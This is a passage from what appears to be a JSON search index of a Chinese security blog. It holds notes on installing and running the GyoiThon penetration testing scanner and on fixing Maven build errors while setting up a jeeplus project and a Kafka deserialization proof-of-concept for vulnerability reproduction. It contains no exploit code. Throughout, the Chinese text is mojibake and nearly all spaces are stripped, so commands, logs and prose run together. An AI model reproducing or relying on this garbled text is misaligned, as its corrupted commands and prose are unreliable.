.0.3(from-rrequirements.txt(line7))æŠ¥é”™ERROR:Nomatchingdistributionfoundformatplotlib&gt;=3.0.3(from-rrequirements.txt(line7))ç§°æ²¡æœ‰æ‰¾åˆ°åŒ¹é…çš„ç‰ˆæœ¬ï¼Œä»¥ä¸ºæ˜¯pipçš„ç‰ˆæœ¬é—®é¢˜ï¼Œæ‰€ä»¥è¿›è¡Œpipç‰ˆæœ¬å‡çº§ã€‚python-mpipinstall--upgradepipDEPRECATION:Python2.7willreachtheendofitslifeonJanuary1st,2020.PleaseupgradeyourPythonasPython2.7won'tbemaintainedafterthatdate.AfutureversionofpipwilldropsupportforPython2.7.MoredetailsaboutPython2supportinpip,canbefoundathttps://pip.pypa.io/en/latest/development/release-process/#python-2-supportRequirementalreadyup-to-date:pipinc:\\python27\\lib\\site-packages(19.3.1)1.1æŠ¥é”™è§£å†³ä½†æ˜¯ä¾ç„¶æ— æ•ˆï¼Œç³»ç»Ÿæç¤ºpipä¸ºæœ€æ–°ç‰ˆæœ¬ã€‚æ€ç´¢ç€åº”è¯¥æ˜¯pythonçš„ç‰ˆæœ¬é—®é¢˜ã€‚ç›´æ¥å°±ä¸Špython3ä½¿ç”¨pip3è¿›è¡Œä¸‹è½½æ›´æ–°ï¼špip3install-rrequirements.txt-ihttp://pypi.douban.com/simple/--trusted-hostpypi.douban.com##é€Ÿåº¦å¯ä»¥æ„Ÿå—ä¸€ä¸‹ï¼šLookinginindexes:http://pypi.douban.com/simple/Requirementalreadysatisfied:beautifulsoup4&gt;=4.6.3in/usr/lib/python3/dist-packages(from-rrequirements.txt(line1))(4.8.0)Collectingcchardet&gt;=2.1.4(from-rrequirements.txt(line2))Downloadinghttp://pypi.doubanio.com/packages/c6/20/905b6c5664736d884a40ac3b1204ab874c3c4a8ce86f7b2e28abc1fc6ee4/cchardet-2.1.5-cp37-cp37m-manylinux1_x86_64.whl(241kB)100%|â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ|245kB6.9MB/sCollectingcensys&gt;=0.0.8(from-rrequirements.txt(line3))-i$url--trust-host$hostæ­¤å‚æ•°åˆ™æ˜¯æŒ‡å®špipä¸‹è½½æ›´æ–°çš„urlåº“ã€‚åæ¥å‘ç°ï¼Œrequirementsä¸­ï¼Œmatplotlib&gt;=3.0.3è¿™ä¸€é¡¹ä¾èµ–éœ€è¦python3.6ç‰ˆæœ¬ä»¥ä¸Šï¼Œæ‰€ä»¥è¿è¡Œä¼šæŠ¥é”™ã€‚cat/media/root/binAxin/GyoiThon/requirements.txtbeautifulsoup4&gt;=4.6.3cchardet&gt;=2.1.4censys&gt;=0.0.8docopt&gt;=0.6.2google-api-python-client&gt;=1.7.4Jinja2&gt;=2.10.1matplotlib&gt;=3.0.3msgpack-python&gt;=0.5.6networkx&gt;=2.2pandas&gt;=0.22.0pysocks&gt;=1.6.7Scrapy&gt;=1.5.0tldextract&gt;=2.2.1urllib3&gt;=1.252æ‰«æä½¿ç”¨2.1é…ç½®hostè¿è¡Œgyoithonåï¼Œä¼šåœ¨moduleæ–‡ä»¶å¤¹å¯¹CVEæ¼æ´è¿›è¡Œæ›´æ–°é…ç½®ï¼Œæ­¤æ—¶æˆ‘ä»¬ç­‰å¾…å³å¯ã€‚çœ‹ä¸€ä¸‹ç®€ä»‹ï¼šGyoiThonæ˜¯ä¸€æ¬¾åŸºäºæœºå™¨å­¦ä¹ çš„æ¸—é€æµ‹è¯•å·¥å…·GyoiThonæ ¹æ®å­¦ä¹ æ•°æ®è¯†åˆ«å®‰è£…åœ¨WebæœåŠ¡å™¨ä¸Šçš„è½¯ä»¶ï¼ˆæ“ä½œç³»ç»Ÿï¼Œä¸­é—´ä»¶ï¼Œæ¡†æ¶ï¼ŒCMSç­‰ï¼‰ã€‚ä¹‹åï¼ŒGyoiThonä¸ºå·²è¯†åˆ«çš„è½¯ä»¶æ‰§è¡Œæœ‰æ•ˆçš„æ”»å‡»ã€‚æœ€ç»ˆï¼ŒGyoiThonä¼šè‡ªåŠ¨ç”Ÿæˆæ‰«æç»“æœæŠ¥å‘Šã€‚ä¸Šè¿°å¤„ç†å‡ç”±GyoiThonè‡ªåŠ¨æ‰§è¡Œï¼›ç”¨æˆ·å”¯ä¸€çš„æ“ä½œå°±æ˜¯åœ¨GyoiThonä¸­ï¼Œè¾“å…¥ç›®æ ‡webæœåŠ¡å™¨çš„é¦–é¡µURLã€‚è¿™éå¸¸çš„ç®€å•ï¼Œå‡ ä¹ä¸èŠ±è´¹ä½ ä»»ä½•çš„æ—¶é—´å’Œç²¾åŠ›ï¼Œå°±èƒ½è®©ä½ è½»æ¾çš„è¯†åˆ«WebæœåŠ¡å™¨ä¸Šçš„æ¼æ´ã€‚æ‰€ä»¥GyoiThonéœ€è¦ä¸€äº›è¯†åˆ«é¡¹ï¼ˆç‰¹å¾åº“ï¼‰è¿›è¡ŒåŒ¹é…ï¼Œä¸‹è½½å®Œåï¼Œå°±å¯ä»¥ä½¿ç”¨æ‰«æå™¨äº†ï¼›éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬è¿è¡Œå‰éœ€è¦å¯¹hostæ–‡ä»¶è¿›è¡Œé…ç½®#lsconfig.inihandoutLICENSE__pycache__requirements.txtutil.pydockerhost.txtlogsREADME.mdsignaturesutil.pycgyoithon.pyimgmodulesreporttemp_signatures#cathost.txthttplocalhost80/å¦‚ä¸Šï¼Œæ ¼å¼ä¸ºï¼šåè®®&lt;ç©ºæ ¼&gt;urlåœ°å€&lt;ç©ºæ ¼&gt;ç«¯å£å·&lt;ç©ºæ ¼&gt;è·¯å¾„PSG:\\GyoiThon&gt;python3.\\gyoithon.py^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â•â•â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â•šâ•â•â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ•—â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â•šâ•â•â•â•â•â•â•šâ•â•â•šâ•â•â•â•â•â•â•šâ•â•â•šâ•â•â•šâ•â•â•šâ•â•â•šâ•â•â•â•â•â•â•šâ•â•â•šâ•â•â•â•(beta)^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^bygyoithon.py=[GyoiThonv0.0.3-beta]=+----=[Author:Gyoiler(@gyoithon)]=--+----=[Website:https://github.com/gyoisamurai/GyoiThon/]=--æ‰«æå®Œæˆåï¼Œæ‰«æå™¨å°±ä¼šå‡ºä¸€ä¸ªcsvçš„æŠ¥å‘ŠæŸ¥çœ‹å³å¯ã€‚ä»¥ä¸Šã€‚"
  },

  {
    "title"    : "Mavenæ„å»ºé¡¹ç›®ç›¸å…³ä¸€æ½å­çŸ¥è¯†",
    "category" : "",
    "tags"     : "ç¬”è®°, Maven, Web",
    "url"      : "/blog/2020/maven/build/mavaProject/",
    "date"     : "Jan 19, 2020",
    "content"  : "2020/01/21æ›´æ–°ï¼›Thu,26Aug202114:50:02+0800å†æ¬¡æ›´æ–°ï¼›åºæœ¬æ–‡ä¸»è¦æ˜¯å¯¹äºåœ¨æ¼æ´å¤ç°çŠ¹å…¶æ˜¯Mavenpocé¡¹ç›®ä»£ç çš„éƒ¨åˆ†ä¸ªäººæ€»ç»“å¸ˆå‚…æœ€è¿‘è®©æˆ‘çœ‹freebufä¸Šä¸€ç¯‡å…³äºjeeplusä»£ç å®¡è®¡çš„æ–‡ç« ï¼Œæ–‡ç« è®²çš„æ˜¯ä¸é”™çš„ï¼Œè‡ªå·±æ‰¾äº†ä¸ªé¡¹ç›®æ¥åšï¼Œä¹‹å‰æ²¡æœ‰javaå¼€å‘çš„åŸºç¡€ï¼Œæ‰€ä»¥ä¸¤çœ¼ä¸€æŠ¹é»‘ï¼Œæµªè´¹äº†ä¸å°‘æ—¶é—´ï¼Œéšç¬”è®°ã€‚é›¶ï¼šå„ç§Mavenç°è±¡#0x01404notfoundeclipseå¯¼å…¥jeeplusé¡¹ç›®åï¼Œç”¨Mavenæ„å»ºï¼Œtomcatéƒ¨ç½²æˆåŠŸæœªæŠ¥é”™ï¼Œæ€»æ˜¯è®¿é—®ä¸äº†é¡¹ç›®ï¼Œä¸€ç›´404ï¼Œä»¥ä¸‹ä¸ºCSDNæœç´¢åŸç­”æ¡ˆï¼šè§£å†³å¦‚ä¸‹é€‰ä¸­â€œé¡¹ç›®â€ï¼Œç„¶åå³å‡»é€‰æ‹©â€œpropertiesâ€â€”&gt;Deploymentï¼Œç„¶åå°†webContenté¡¹removeæ‰ï¼Œè¿˜æœ‰testç›¸å…³çš„æ–‡ä»¶ä¹Ÿå¯ä»¥removeæ‰ï¼Œtestæ˜¯æµ‹è¯•ç›¸å…³çš„æ–‡ä»¶ï¼Œaddä¸€ä¸ªfolderæ–‡ä»¶ï¼Œnext-&gt;next-&gt;srcä¸‹çš„mainä¸‹çš„webappæ–‡ä»¶ï¼Œæœ€åå‡»â€œFinishâ€ï¼Œåœ¨addä¸€ä¸ªJavaBuildPathEntriesï¼Œnext-&gt;MavenDependenciesæœ€åå†ç‚¹å‡»â€Finishâ€ï¼›æœ€åå†ç‚¹å‡»â€OKâ€;é‡æ–°å¯åŠ¨tomcatï¼Œåœ¨æµè§ˆå™¨ä¸­è¾“å…¥ç›¸åº”çš„åœ°å€ï¼šhttp://localhost:8080/MavenTest/index.jspï¼Œè¿›è¡Œæµ‹è¯•webé¡¹ç›®æ˜¯å¦åˆ›å»ºæˆåŠŸã€‚æ€»ç»“ï¼šè‹¥æ˜¯IDEAéƒ¨ç½²å‡ºç°äº†404çš„é—®é¢˜ï¼Œé‚£ä¹ˆå°±ç€é‡æ£€æŸ¥ProjectStructureçª—å£ä¸‹ProjectSettings:Modules/Libraries/Artifacts/Facetså­æ ä¸‹çš„é…ç½®æ˜¯å¦æœ‰é—®é¢˜ï¼šå¦‚Mavené¡¹ç›®é¡»åœ¨Modulesä¸‹æ–°å»ºMavençš„æ¨¡ç‰ˆï¼ŒWebé¡¹ç›®Artifactsè¦æ·»åŠ WebApplicationç­‰ç­‰è‹¥æ˜¯Terminalç»ˆç«¯è¿›è¡ŒMavenç¼–è¯‘åï¼Œé‚£ä¹ˆé¡»æ£€æŸ¥targetç›®å½•ä¸‹æ˜¯å¦æœ‰war/jaræ–‡ä»¶ï¼Œéšå³war:éƒ¨ç½²åˆ°TomcatWebApps|jar:javaå¯åŠ¨å³å¯ã€‚#0x02tomcatjarnotfoundå¦‚æœä½ æ˜¯mavené¡¹ç›®ï¼Œtomcatåœ¨å‘å¸ƒé¡¹ç›®çš„æ—¶å€™æ²¡æœ‰åŒæ—¶å‘å¸ƒmavenä¾èµ–æ‰€æ·»åŠ çš„jaråŒ…ï¼Œä½ éœ€è¦è®¾ç½®ä¸€ä¸‹eclipseï¼šé¡¹ç›®-&gt;å±æ€§-&gt;DeploymentAssembly-&gt;Add-&gt;JavaBuildPathEntries-&gt;é€‰æ‹©MavenDependencies-&gt;Finish-&gt;OKæŠŠå¯¹åº”çš„Mavenä¾èµ–åŒ…ä¹Ÿå‘å¸ƒåˆ°tomcatï¼Œè°ƒè¯•æ—¶ä¼šè‡ªåŠ¨æŠŠé‚£äº›jarå‘å¸ƒåˆ°æŒ‡å®šç›®å½•ä¸‹ï¼Œtomcatä¹Ÿèƒ½æ‰¾åˆ°é‚£äº›jaräº†ã€‚ç»“åˆeclipseï¼š&gt;mvneclipse:clean&gt;mvneclipse:eclipse&gt;mvneclipse:eclipseEclipse&gt;mvneclipse:eclipseâ€“Dwtpversion=1.0#0x03jarä¸­æ²¡æœ‰ä¸»æ¸…å•å±æ€§1)META-INF/MANIFEST.MF1.1)fileâ€“&gt;projectstructureå¼¹æ¡†åé€‰ä¸­Atifactsâ€”&gt;+-&gt;jar-&gt;frommodulewithdependenceis1.2)é€‰æ‹©MainClassï¼Œç„¶åæŒ‡å®šMETA-INF/MANIFEST.MFçš„è·¯å¾„ä¸ºsrcä¸‹ï¼ˆæ³¨æ„ä¸è¦æ”¾åˆ°main/javaç›®å½•ä¸‹ï¼Œå¦åˆ™æ‰“æˆçš„jarä¸­META-INF/MANIFEST.MFä¸å«æœ‰Main-Classä¿¡æ¯ï¼‰æˆ–è€…ï¼š2)pom.xmlåŸGithubé¡¹ç›®kafka-deserialization-bugæ— æ³•æ„å»ºæˆåŠŸï¼›2.1)åŸpompluginæ ‡ç­¾&lt;plugins&gt;&lt;plugin&gt;&lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;&lt;artifactId&gt;maven-dependency-plugin&lt;/artifactId&gt;&lt;executions&gt;&lt;execution&gt;&lt;id&gt;copy-dependencies&lt;/id&gt;&lt;phase&gt;prepare-package&lt;/phase&gt;&lt;goals&gt;&lt;goal&gt;copy-dependencies&lt;/goal&gt;&lt;/goals&gt;&lt;configuration&gt;&lt;outputDirectory&gt;${project.build.directory}/lib&lt;/outputDirectory&gt;&lt;/configuration&gt;&lt;/execution&gt;&lt;/executions&gt;&lt;/plugin&gt;&lt;/plugins&gt;ä¿®æ”¹åï¼š&lt;build&gt;&lt;plugins&gt;&lt;plugin&gt;&lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;&lt;artifactId&gt;maven-dependency-plugin&lt;/artifactId&gt;&lt;executions&gt;&lt;execution&gt;&lt;id&gt;copy-dependencies&lt;/id&gt;&lt;phase&gt;prepare-package&lt;/phase&gt;&lt;goals&gt;&lt;goal&gt;copy-dependencies&lt;/goal&gt;&lt;/goals&gt;&lt;configuration&gt;&lt;outputDirectory&gt;${project.build.directory}/lib&lt;/outputDirectory&gt;&lt;/configuration&gt;&lt;/execution&gt;&lt;/executions&gt;&lt;/plugin&gt;&lt;plugin&gt;&lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;&lt;artifactId&gt;maven-shade-plugin&lt;/artifactId&gt;&lt;version&gt;1.2.1&lt;/version&gt;&lt;executions&gt;&lt;execution&gt;&lt;phase&gt;package&lt;/phase&gt;&lt;goals&gt;&lt;goal&gt;shade&lt;/goal&gt;&lt;/goals&gt;&lt;configuration&gt;&lt;transformers&gt;&lt;transformerimplementation=\"org.apache.maven.plugins.shade.resource.ManifestResourceTransformer\"&gt;&lt;mainClass&gt;com.unionpay.kafka.test.OfficialPocMain&lt;/mainClass&gt;&lt;/transformer&gt;&lt;/transformers&gt;&lt;/configuration&gt;&lt;/execution&gt;&lt;/executions&gt;&lt;/plugin&gt;&lt;/plugins&gt;&lt;/build&gt;ä¸€ï¼šMavenæ„å»ºå°å¼Ÿä¹‹å‰javaå­¦çš„è´¼çƒ‚ï¼Œæ›´åˆ«è¯´é«˜ç«¯çš„ã€ŒMavenã€æ„å»ºäº†ï¼Œç ”ç©¶äº†å°†è¿‘ä¸€ä¸ªæ˜ŸæœŸï¼Œç»ˆäºä½¿ç”¨Mavenæ„å»ºèµ·ç¬¬ä¸€ä¸ªJavawebé¡¹ç›®ï¼ŒæŒ‰è€ä¸ä½å†…å¿ƒçš„æ¿€åŠ¨å¿ƒæƒ…ï¼Œé‚è®°å½•ä¸‹ç¬¬ä¸€æ­¥è·å–Mavenæ„å»ºçš„é¡¹ç›®ï¼Œåªæœ‰ç”¨Mavenæ„å»ºçš„javaé¡¹ç›®ï¼Œæˆ‘ä»¬æ‰èƒ½å¤ŸMavenè¿›è¡Œæ„å»ºéƒ¨ç½²ï¼›ä¸‹é¢è¿™ä¸ªæ˜¯æˆ‘ç”¨æ¥ç»ƒæ‰‹çš„é¡¹ç›®ã€‚å½“ç„¶ä¹Ÿå¯ä»¥åˆ°githubä¸Šæ‰¾åˆ°ã€‚æ­¤å¤„Mavenç¯å¢ƒé…ç½®ç•¥è¿‡ï¼Œå¤šæä¸€å¥ï¼Œè¿™é‡ŒåŒ…æ‹¬Mavençš„æœ¬åœ°ç¯å¢ƒå˜é‡çš„é…ç½®å’Œæœ¬åœ°ä»“åº“çš„é…ç½®ï¼Œè‡ªè¡Œé—®åº¦å¨˜ã€‚PSC:\\Users\\æœ¬é˜¿ä¿¡&gt;cdG:\\yj-work\\java-code\\jeeplus-openPSG:\\yj-work\\java-code\\jeeplus-open&gt;lsç›®å½•:G:\\yj-work\\java-code\\jeeplus-openModeLastWriteTimeLengthName---------------------------d-----2020/1/1016:26.idead-----2020/1/911:03.settingsd-----2020/1/911:03srcd-----2020/1/911:03target-a----2020/1/911:031350.classpath-a----2020/1/911:031444.project-a----2016/9/49:1110252LICENSE-a----2016/9/49:1123054pom.xml-a----2016/9/49:11371README.md#1x01Mavenï¼šeffective-pomæ„å»ºå¦‚ä¸Šï¼Œå…³é”®pomå±æ€§ï¼›ä¸Šé¢å¯ä»¥çœ‹åˆ°mavenæ„å»ºçš„pom.xmlæ–‡ä»¶ï¼Œè¾“å…¥å‘½ä»¤mvnhelp:effective-pomMavenå°†ä¼šå¼€å§‹å¤„ç†å¹¶æ˜¾ç¤ºeffective-pomã€‚å¦‚ä¸‹ï¼šPSG:\\yj-work\\java-code\\jeeplus-open&gt;mvnhelp:effective-pom[INFO]Scanningforprojects...[WARNING][WARNING]Someproblemswereencounteredwhilebuildingtheeffectivemodelforjeeplus:jeeplus:war:1.0.0-SNAPSHOT[WARNING]'dependencies.dependency.(groupId:artifactId:type:classifier)'mustbeunique:javax.servlet.jsp:jsp-api:jar-&gt;version2.1vs2.2@line278,column21[WARNING][WARNING]Itishighlyrecommendedtofixtheseproblemsbecausetheythreatenthestabilityofyourbuild.[WARNING][WARNING]Forthisreason,futureMavenversionsmightnolongersupportbuildingsuchmalformedprojects.[WARNING][INFO][INFO]--------------------------&lt;jeeplus:jeeplus&gt;---------------------------[INFO]Buildingjeeplusx1.0.0-SNAPSHOT[INFO]--------------------------------[war]---------------------------------[INFO][INFO]---maven-help-plugin:3.2.0:effective-pom(default-cli)@jeeplus---Downloadingfromalimaven:http://maven.aliyun.com/nexus/content/groups/public/org/apache/maven/maven-model/3.6.1/maven-model-3.6.1.pomDownloadedfromalimaven:http://maven.aliyun.com/nexus/content/groups/public/org/apache/maven/maven-model/3.6.1/maven-model-3.6.1.pom(4.0kBat4.1kB/s)Downloadingfromalimaven:http://maven.aliyun.com/nexus/content/groups/public/org/apache/maven/maven/3.6.1/maven-3.6.1.pomDownloadedfromalimaven:http://maven.aliyun.com/nexus/content/groups/public/org/apache/maven/maven/3.6.1/maven-3.6.1.pom(24kBat95kB/s)###################################################################ä¸­é—´å…·ä½“ä¸‹è½½è¿‡ç¨‹ç•¥:&gt;#####################################################################æˆ‘æŠŠè¿™ä¸‹é¢çš„éƒ¨åˆ†ï¼Œç‰¹æ„åŒºåˆ†å‡ºæ¥ï¼Œæ–¹ä¾¿çœ‹çš„æ›´æ¸…æ¥šï¼Œå½“æˆ‘ä»¬å¯¹é¡¹ç›®è¿›è¡Œæ„å»ºæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°é¡¹ç›®ç›¸å…³çš„ä¸€äº›å…ƒç´ ã€‚æœ‰çš„æ—¶å€™ï¼Œå½“æˆ‘ä»¬è¿˜æ˜¯æ–°æ‰‹çš„æ—¶å€™ï¼Œè¿™æ ·çš„æ§åˆ¶å°è¾“å‡ºçœŸçš„ä¼šä»¤äººæ¿€åŠ¨ï¼@-@å¦‚ä¸‹ï¼Œmavenå›æ˜¾å‡ºæœ‰å…³äºjeeplusé¡¹ç›®çš„EffectivePOMsï¼š[INFO]EffectivePOMs,afterinheritance,interpolation,andprofilesareapplied:&lt;?xmlversion=\"1.0\"encoding=\"GBK\"?&gt;&lt;!--======================================================================--&gt;&lt;!----&gt;&lt;!--GeneratedbyMavenHelpPluginon2020-01-19T15:52:57+08:00--&gt;&lt;!--See:http://maven.apache.org/plugins/maven-help-plugin/--&gt;&lt;!----&gt;&lt;!--======================================================================--&gt;&lt;!--======================================================================--&gt;&lt;!----&gt;&lt;!--EffectivePOMforproject'jeeplus:jeeplus:war:1.0.0-SNAPSHOT'--&gt;&lt;!----&gt;&lt;!--======================================================================--&gt;#########################################################ä¸­é—´å…·ä½“groupidã€artifactidç­‰é…ç½®ç•¥:&gt;##############################################################[INFO]------------------------------------------------------------------------[INFO]BUILDSUCCESS[INFO]------------------------------------------------------------------------[INFO]Totaltime:12.235s[INFO]Finishedat:2020-01-19T15:53:00+08:00[INFO]------------------------------------------------------------------------åœ¨ä¸Šé¢çš„pom.xmlä¸­å¯ä»¥çœ‹åˆ°Mavenåœ¨æ‰§è¡Œç›®æ ‡æ—¶éœ€è¦ç”¨åˆ°çš„é»˜è®¤å·¥ç¨‹æºç ç›®å½•ç»“æ„ã€è¾“å‡ºç›®å½•ã€éœ€è¦çš„æ’ä»¶ã€ä»“åº“å’ŒæŠ¥è¡¨ç›®å½•ã€‚Mavençš„pom.xmlæ–‡ä»¶ä¹Ÿä¸éœ€è¦æ‰‹å·¥ç¼–å†™ã€‚Mavenæä¾›äº†å¤§é‡çš„åŸå‹æ’ä»¶æ¥åˆ›å»ºå·¥ç¨‹ï¼ŒåŒ…æ‹¬å·¥ç¨‹ç»“æ„å’Œpom.xmlã€‚é¡ºä¾¿æä¸€ä¸‹å…³äºwebä¸­çš„propertiesæ–‡ä»¶é…ç½®è¿›å…¥jeeplusé¡¹ç›®ï¼Œæ ¹æ®è‡ªå·±ç”µè„‘çš„ä¸åŒç¯å¢ƒï¼Œå¯¹propertiesæ–‡ä»¶è¿›è¡Œé…ç½®ï¼Œè€Œæ­¤å¤„æœ¬åœ°çš„é¡¹ç›®è‡ªå®šä¹‰é…ç½®æ•°æ®åº“é…ç½®æ–‡ä»¶åˆ™æ˜¯\\src\\main\\resources\\jeeplus.propertiesï¼›æˆ‘å•å•æŠŠmysqlæ•°æ®åº“çš„é…ç½®ä»£ç è´´å‡ºæ¥ï¼Œå¦‚ä¸‹ï¼šjdbc.type=mysqljdbc.driver=com.mysql.jdbc.Driverjdbc.url=jdbc:mysql://localhost:3306/jeeplus_schema?useUnicode=true&amp;characterEncoding=utf-8jdbc.username=rootjdbc.password=rootæŠŠmysqlæ•°æ®åº“çš„è´¦å·å¯†ç è®¾ç½®æˆæœ¬åœ°çš„æ•°æ®åº“è´¦å·å¯†ç å°±å¥½ï¼Œæ¯”å¦‚æˆ‘æœ¬åœ°çš„mysqlè´¦å·å¯†ç å‡ä¸ºroot,å¡«ä¸Šæ­£ç¡®å³å¯ï¼Œä¸ç„¶ä¼šæŠ¥é”™ã€‚ç„¶åè¿è¡Œmysqlï¼Œä¸‹ä¸€æ­¥å°±è¿›è¡Œmavenæ„å»ºã€‚#1x02Mavenï¼štestè¾“å…¥mvntestï¼ŒæŸ¥çœ‹mavenæ„å»ºjavaé¡¹ç›®æ˜¯å¦å­˜åœ¨æŠ¥é”™ï¼šPSG:\\yj-work\\java-code\\jeeplus-open&gt;mvntest[INFO]Scanningforprojects...[WARNING][WARNING]Someproblemswereencounteredwhilebuildingtheeffectivemodelforjeeplus:jeeplus:war:1.0.0-SNAPSHOT[WARNING]'dependencies.dependency.(groupId:artifactId:type:classifier)'mustbeunique:javax.servlet.jsp:jsp-api:jar-&gt;version2.1vs2.2@line278,column21[WARNING][WARNING]Itishighlyrecommendedtofixtheseproblemsbecausetheythreatenthestabilityofyourbuild.[WARNING][WARNING]Forthisreason,futureMavenversionsmightnolongersupportbuildingsuchmalformedprojects.[WARNING][INFO][INFO]--------------------------&lt;jeeplus:jeeplus&gt;---------------------------[INFO]Buildingjeeplusx1.0.0-SNAPSHOT[INFO]--------------------------------[war]---------------------------------[INFO][INFO]---maven-resources-plugin:2.6:resources(default-resources)@jeeplus---[INFO]Using'UTF-8'encodingtocopyfilteredresources.[INFO]Copying65resources[INFO][INFO]---maven-compiler-plugin:3.3:compile(default-compile)@jeeplus---[INFO]Changesdetected-recompilingthemodule![INFO]Compiling258sourcefilestoG:\\yj-work\\java-code\\jeeplus-open\\target\\classes[INFO]/G:/yj-work/java-code/jeeplus-open/src/main/java/com/jeeplus/modules/tools/utils/HttpPostTest.java:æŸäº›è¾“å…¥æ–‡ä»¶ä½¿ç”¨æˆ–è¦†ç›–äº†å·²è¿‡æ—¶çš„APIã€‚[INFO]/G:/yj-work/java-code/jeeplus-open/src/main/java/com/jeeplus/modules/tools/utils/HttpPostTest.java:æœ‰å…³è¯¦ç»†ä¿¡æ¯,è¯·ä½¿ç”¨-Xlint:deprecationé‡æ–°ç¼–è¯‘ã€‚[INFO]/G:/yj-work/java-code/jeeplus-open/src/main/java/com/jeeplus/common/json/AjaxJson.java:æŸäº›è¾“å…¥æ–‡ä»¶ä½¿ç”¨äº†æœªç»æ£€æŸ¥æˆ–ä¸å®‰å…¨çš„æ“ä½œã€‚[INFO]/G:/yj-work/java-code/jeeplus-open/src/main/java/com/jeeplus/common/json/AjaxJson.java:æœ‰å…³è¯¦ç»†ä¿¡æ¯,è¯·ä½¿ç”¨-Xlint:uncheckedé‡æ–°ç¼–è¯‘ã€‚[INFO][INFO]---maven-resources-plugin:2.6:testResources(default-testResources)@jeeplus---[INFO]Using'UTF-8'encodingtocopyfilteredresources.[INFO]skipnonexistingresourceDirectoryG:\\yj-work\\java-code\\jeeplus-open\\src\\test\\resources[INFO][INFO]---maven-compiler-plugin:3.3:testCompile(default-testCompile)@jeeplus---[INFO]Nosourcestocompile[INFO][INFO]---maven-surefire-plugin:2.12.4:test(default-test)@jeeplus---[INFO]------------------------------------------------------------------------[INFO]BUILDSUCCESS[INFO]------------------------------------------------------------------------[INFO]Totaltime:10.063s[INFO]Finishedat:2020-01-19T16:46:53+08:00[INFO]------------------------------------------------------------------------#1x03Mavenï¼šcleanpackageç´§æ¥ç€è¾“å…¥mvncleanpackageå‘½ä»¤ï¼›PSG:\\yj-work\\java-code\\jeeplus-open&gt;mvncleanpackage[INFO]Scanningforprojects...[WARNING][WARNING]Someproblemswereencounteredwhilebuildingtheeffectivemodelforjeeplus:jeeplus:war:1.0.0-SNAPSHOT[WARNING]'dependencies.dependency.(groupId:artifactId:type:classifier)'mustbeunique:javax.servlet.jsp:jsp-api:jar-&gt;version2.1vs2.2@line278,column21[WARNING][WARNING]Itishighlyrecommendedtofixtheseproblemsbecausetheythreatenthestabilityofyourbuild.[WARNING][WARNING]Forthisreason,futureMavenversionsmightnolongersupportbuildingsuchmalformedprojects.[WARNING][INFO][INFO]--------------------------&lt;jeeplus:jeeplus&gt;---------------------------[INFO]Buildingjeeplusx1.0.0-SNAPSHOT[INFO]--------------------------------[war]---------------------------------[INFO][INFO]---maven-clean-plugin:2.5:clean(default-clean)@jeeplus---[INFO]DeletingG:\\yj-work\\java-code\\jeeplus-open\\target[INFO][INFO]---maven-resources-plugin:2.6:resources(default-resources)@jeeplus---[INFO]Using'UTF-8'encodingtocopyfilteredresources.[INFO]Copying65resources[INFO][INFO]---maven-compiler-plugin:3.3:compile(default-compile)@jeeplus---[INFO]Changesdetected-recompilingthemodule![INFO]Compiling258sourcefilestoG:\\yj-work\\java-code\\jeeplus-open\